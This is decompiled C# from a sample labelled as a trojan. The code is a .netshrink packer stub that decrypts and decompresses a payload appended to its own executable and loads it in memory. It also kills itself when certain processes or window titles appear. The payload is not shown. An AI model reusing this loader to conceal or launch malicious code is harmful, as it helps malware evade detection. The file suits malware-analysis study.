// Decompiled with JetBrains decompiler
// Type:  
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 32BC53D7-A239-4C18-BE53-ECC907E1DE31
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Inject.edlb-0c8f225037e96d7ea9ccbcdb261d18fcd0563b2c1d3e6f324585b562d987ac19.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0008\u2002
{
  public static \u0008\u2002.\u0003 \u0002;
  public static string[] \u0003;
  public static MemoryStream[] \u0005;
  public static string[] \u0008;
  public static string[] \u0006;
  public static bool \u000E = false;
  private static byte[] \u000F = new byte[32]
  {
    (byte) 52,
    (byte) 68,
    (byte) 254,
    (byte) 61,
    (byte) 154,
    (byte) 16,
    (byte) 205,
    (byte) 1,
    (byte) 0,
    (byte) 212,
    (byte) 46,
    (byte) 36,
    (byte) 238,
    (byte) 171,
    (byte) 53,
    (byte) 15,
    (byte) 52,
    (byte) 68,
    (byte) 254,
    (byte) 61,
    (byte) 154,
    (byte) 16,
    (byte) 205,
    (byte) 1,
    (byte) 0,
    (byte) 212,
    (byte) 46,
    (byte) 36,
    (byte) 238,
    (byte) 171,
    (byte) 53,
    (byte) 15
  };
  private static byte[] \u0002\u2000 = new byte[16]
  {
    (byte) 239,
    (byte) 202,
    (byte) 69,
    (byte) 216,
    (byte) 33,
    (byte) 53,
    (byte) 74,
    (byte) 206,
    (byte) 195,
    (byte) 204,
    (byte) 146,
    (byte) 63,
    (byte) 253,
    (byte) 56,
    (byte) 120,
    (byte) 17
  };

  private static \u0008\u2002.\u0003 \u0002(MemoryStream _param0)
  {
    byte[] buffer = new byte[Marshal.SizeOf(typeof (\u0008\u2002.\u0003))];
    _param0.Read(buffer, 0, Marshal.SizeOf(typeof (\u0008\u2002.\u0003)));
    GCHandle gcHandle = GCHandle.Alloc((object) buffer, GCHandleType.Pinned);
    \u0008\u2002.\u0003 structure = (\u0008\u2002.\u0003) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u0008\u2002.\u0003));
    gcHandle.Free();
    return structure;
  }

  private static \u0008\u2002.\u0002 \u0002(
    MemoryStream _param0,
    int _param1,
    ref string _param2,
    ref MemoryStream _param3)
  {
    byte[] buffer1 = new byte[Marshal.SizeOf(typeof (\u0008\u2002.\u0002))];
    _param0.Seek((long) _param1, SeekOrigin.Begin);
    _param0.Read(buffer1, 0, Marshal.SizeOf(typeof (\u0008\u2002.\u0002)));
    GCHandle gcHandle = GCHandle.Alloc((object) buffer1, GCHandleType.Pinned);
    \u0008\u2002.\u0002 structure = (\u0008\u2002.\u0002) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u0008\u2002.\u0002));
    gcHandle.Free();
    byte[] numArray = new byte[structure.\u0008];
    _param0.Seek((long) structure.\u0005, SeekOrigin.Begin);
    _param0.Read(numArray, 0, structure.\u0008);
    _param2 = Encoding.UTF8.GetString(numArray);
    byte[] buffer2 = new byte[structure.\u0003];
    _param0.Seek((long) structure.\u0002, SeekOrigin.Begin);
    _param0.Read(buffer2, 0, structure.\u0003);
    _param3.Write(buffer2, 0, structure.\u0003);
    return structure;
  }

  private static string \u0002(MemoryStream _param0, int _param1, int _param2)
  {
    byte[] numArray = new byte[_param2];
    _param0.Seek((long) _param1, SeekOrigin.Begin);
    _param0.Read(numArray, 0, _param2);
    return Encoding.UTF8.GetString(numArray);
  }

  private static Assembly \u0002(object _param0, ResolveEventArgs _param1)
  {
    string strB = new AssemblyName(_param1.Name).Name + ".dll";
    for (int index = 1; index < \u0008\u2002.\u0002.\u0003; ++index)
    {
      if (string.Compare(\u0008\u2002.\u0003[index], strB, true) == 0)
        return Assembly.Load(\u0008\u2002.\u0005[index].ToArray());
    }
    return (Assembly) null;
  }

  public static bool \u0002(string _param0, string _param1)
  {
    switch (_param0)
    {
      case "":
      case null:
        return false;
      default:
        return new Regex(_param1.Replace(".", "[.]").Replace("*", ".*").Replace('?', '.').ToLower()).IsMatch(_param0.ToLower());
    }
  }

  public static bool \u0002(string _param0, string[] _param1)
  {
    foreach (string str in _param1)
    {
      if (\u0008\u2002.\u0002(_param0, str))
        return true;
    }
    return false;
  }

  public static void \u0002()
  {
    Process.GetCurrentProcess().CloseMainWindow();
    Process.GetCurrentProcess().Close();
    Process.GetCurrentProcess().Kill();
  }

  public static void \u0003()
  {
    while (!\u0008\u2002.\u000E)
    {
      Process[] processes = Process.GetProcesses();
      for (int index = 0; index < processes.Length - 1; ++index)
      {
        if (\u0008\u2002.\u0002(processes[index].ProcessName, \u0008\u2002.\u0008))
          \u0008\u2002.\u0002();
        if (\u0008\u2002.\u0002(processes[index].MainWindowTitle, \u0008\u2002.\u0006))
          \u0008\u2002.\u0002();
        Thread.Sleep(100);
      }
      Thread.Sleep(1500);
    }
  }

  private static string \u0002(string _param0)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    byte[] bytes = Encoding.UTF8.GetBytes(_param0);
    ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor(\u0008\u2002.\u000F, \u0008\u2002.\u0002\u2000);
    MemoryStream memoryStream = new MemoryStream();
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, encryptor, CryptoStreamMode.Write);
    cryptoStream.Write(bytes, 0, bytes.Length);
    cryptoStream.FlushFinalBlock();
    byte[] array = memoryStream.ToArray();
    memoryStream.Close();
    cryptoStream.Close();
    return Convert.ToBase64String(array);
  }

  private static string \u0003(string _param0)
  {
    if (!(_param0 != ""))
      return "";
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    byte[] buffer = Convert.FromBase64String(_param0);
    ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(\u0008\u2002.\u000F, \u0008\u2002.\u0002\u2000);
    MemoryStream memoryStream = new MemoryStream(buffer);
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
    byte[] numArray = new byte[buffer.Length];
    int count = cryptoStream.Read(numArray, 0, numArray.Length);
    memoryStream.Close();
    cryptoStream.Close();
    return Encoding.UTF8.GetString(numArray, 0, count);
  }

  private static string \u0002(string[] _param0)
  {
    string str = "";
    for (int index = 0; index < _param0.Length; ++index)
    {
      str += _param0[index];
      if (index < _param0.Length - 1)
        str += " ";
    }
    return str;
  }

  private static long \u0002(Stream _param0)
  {
    long num1 = 0;
    for (int index = 0; index < 8; ++index)
    {
      int num2 = _param0.ReadByte();
      num1 |= (long) (byte) num2 << 8 * index;
    }
    return num1;
  }

  private static bool \u0002(string _param0, byte _param1)
  {
    byte num1 = 0;
    if (_param0 == "")
      return false;
    foreach (byte num2 in Encoding.UTF8.GetBytes(_param0))
      num1 ^= num2;
    return (int) num1 == (int) _param1;
  }

  [STAThread]
  private static void \u0002(string[] _param0)
  {
    string s = "";
    string[] strArray1 = (string[]) null;
    int length1 = 0;
    try
    {
      if (_param0.Length != 0)
      {
        string[] strArray2 = new string[_param0.Length];
        foreach (string str in _param0)
        {
          if (str.StartsWith("/password="))
          {
            int length2 = str.Length - 10;
            if (length2 != 0)
              s = str.Substring(10, length2);
          }
          else
            strArray2[length1++] = str;
        }
        if (length1 != 0)
        {
          strArray1 = new string[length1];
          for (int index = 0; index < length1; ++index)
            strArray1[index] = strArray2[index];
        }
      }
      if (s == "")
      {
        RegistryKey currentUser = Registry.CurrentUser;
        RegistryKey subKey = currentUser.CreateSubKey("Software\\PELock\\.netshrink\\Passwords");
        string str = (string) subKey.GetValue(Application.ExecutablePath, (object) "");
        currentUser.Close();
        subKey.Close();
        s = \u0008\u2002.\u0003(str);
      }
      MemoryStream memoryStream1 = new MemoryStream();
      Stream stream = (Stream) new FileStream(Application.ExecutablePath, FileMode.Open, FileAccess.Read);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      stream.Seek(-12L, SeekOrigin.End);
      long num1 = \u0008\u2002.\u0002(stream);
      int count1 = rijndaelManaged.BlockSize / 8;
      byte[] numArray = new byte[count1];
      stream.Seek((long) (-8 - count1 - 1 - 4), SeekOrigin.End);
      stream.Read(numArray, 0, count1);
      byte num2 = (byte) stream.ReadByte();
      stream.Seek(-num1 - 8L - 4L, SeekOrigin.End);
      long count2 = num1 - (long) (count1 + 1);
      if (length1 == 0)
        strArray1 = (string[]) _param0.Clone();
      if (!\u0008\u2002.\u0002(s, num2))
      {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        \u0005\u2002 obj = new \u0005\u2002();
        if (obj.ShowDialog() == DialogResult.Cancel || !\u0008\u2002.\u0002(obj.\u0002, num2))
          return;
        string str = obj.\u0002;
        if (obj.\u0003)
        {
          RegistryKey currentUser = Registry.CurrentUser;
          RegistryKey subKey = currentUser.CreateSubKey("Software\\PELock\\.netshrink\\Passwords");
          subKey.SetValue(Application.ExecutablePath, (object) \u0008\u2002.\u0002(obj.\u0002));
          currentUser.Close();
          subKey.Close();
          Process.Start(Application.ExecutablePath, \u0008\u2002.\u0002(strArray1));
        }
        else
          Process.Start(Application.ExecutablePath, \u0008\u2002.\u0002(strArray1) + " /password=" + str);
      }
      else
      {
        byte[] hash = new SHA256Managed().ComputeHash(Encoding.UTF8.GetBytes(s));
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.Key = hash;
        byte[] buffer1 = new byte[count2];
        byte[] buffer2 = new byte[count2];
        stream.Read(buffer1, 0, (int) count2);
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(hash, numArray);
        new CryptoStream((Stream) new MemoryStream(buffer1), decryptor, CryptoStreamMode.Read).Read(buffer2, 0, (int) count2);
        MemoryStream memoryStream2 = new MemoryStream(buffer2);
        long num3 = \u0008\u2002.\u0002((Stream) memoryStream2);
        byte[] buffer3 = new byte[5];
        memoryStream2.Read(buffer3, 0, 5);
        \u0008\u2000 obj = new \u0008\u2000();
        obj.\u0005\u2000\u2004\u2006\u2008\u2002\u0002(buffer3);
        long num4 = \u0008\u2002.\u0002((Stream) memoryStream2);
        obj.\u0003\u2000\u2004\u2006\u2008\u2002\u0002((Stream) memoryStream2, (Stream) memoryStream1, num3, num4, (\u000E\u2001) null);
        stream.Close();
        memoryStream2.Close();
        memoryStream1.Seek(0L, SeekOrigin.Begin);
        \u0008\u2002.\u0002 = \u0008\u2002.\u0002(memoryStream1);
        if (\u0008\u2002.\u0002.\u0002)
        {
          \u0008\u2002.\u0008 = \u0008\u2002.\u0002(memoryStream1, \u0008\u2002.\u0002.\u0005, \u0008\u2002.\u0002.\u0008).Split('|');
          \u0008\u2002.\u0006 = \u0008\u2002.\u0002(memoryStream1, \u0008\u2002.\u0002.\u0006, \u0008\u2002.\u0002.\u000E).Split('|');
          new Thread(new ThreadStart(\u0008\u2002.\u0003)).Start();
        }
        \u0008\u2002.\u0003 = new string[\u0008\u2002.\u0002.\u0003];
        \u0008\u2002.\u0005 = new MemoryStream[\u0008\u2002.\u0002.\u0003];
        int num5 = Marshal.SizeOf(typeof (\u0008\u2002.\u0003));
        for (int index = 0; index < \u0008\u2002.\u0002.\u0003; ++index)
        {
          \u0008\u2002.\u0003[index] = string.Empty;
          \u0008\u2002.\u0005[index] = new MemoryStream();
          \u0008\u2002.\u0002(memoryStream1, num5, ref \u0008\u2002.\u0003[index], ref \u0008\u2002.\u0005[index]);
          num5 += Marshal.SizeOf(typeof (\u0008\u2002.\u0002));
        }
        if (\u0008\u2002.\u0002.\u0003 > 1)
          AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0008\u2002.\u0002);
        Assembly assembly = Assembly.Load(\u0008\u2002.\u0005[0].ToArray());
        if ((object) assembly != null)
        {
          int num6 = (int) MessageBox.Show("This application is compressed with .netshrink (demo version)\n\n.netshrink is a file compressor and password protector for .NET applications.\n\nVisit us at www.pelock.com for more information.", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
          if (assembly.EntryPoint.GetParameters().Length == 0)
            assembly.EntryPoint.Invoke((object) null, (object[]) null);
          else
            assembly.EntryPoint.Invoke((object) null, new object[1]
            {
              (object) strArray1
            });
        }
        if (!\u0008\u2002.\u0002.\u0002)
          return;
        \u0008\u2002.\u000E = \u0008\u2002.\u0002.\u0002;
      }
    }
    catch (Exception ex)
    {
      int num = (int) MessageBox.Show(ex.ToString(), ".netshrink exception");
    }
  }

  public struct \u0002
  {
    public int \u0002;
    public int \u0003;
    public int \u0005;
    public int \u0008;
  }

  public struct \u0003
  {
    public bool \u0002;
    public int \u0003;
    public int \u0005;
    public int \u0008;
    public int \u0006;
    public int \u000E;
  }
}
